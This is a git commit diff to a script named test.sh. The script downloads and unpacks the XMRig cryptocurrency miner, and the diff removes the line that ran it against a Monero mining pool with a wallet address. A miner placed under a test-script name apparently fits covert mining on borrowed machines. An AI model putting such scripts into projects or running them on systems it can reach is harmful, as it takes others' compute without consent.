63201a0b78c5f85c0b142269115e582542fd8137
mikeyytman <mikeyytman@gmail.com>
2024-11-20 21:56:20 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -8,4 +8,3 @@ sudo ph add xmrig
 wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz
 tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz
 cd xmrig-6.22.0
-./xmrig --opencl --cuda -o pool.supportxmr.com:443 -u 42G5pAGjXc4CyTVHhQSCLKN5hYsd8Mu7v5NqYf3ZeSN3NDNQPc1s4tzUj8weae9js6gg3g7Tre972jR5oZpr3Kj5RYh7y85.1 -k --tls
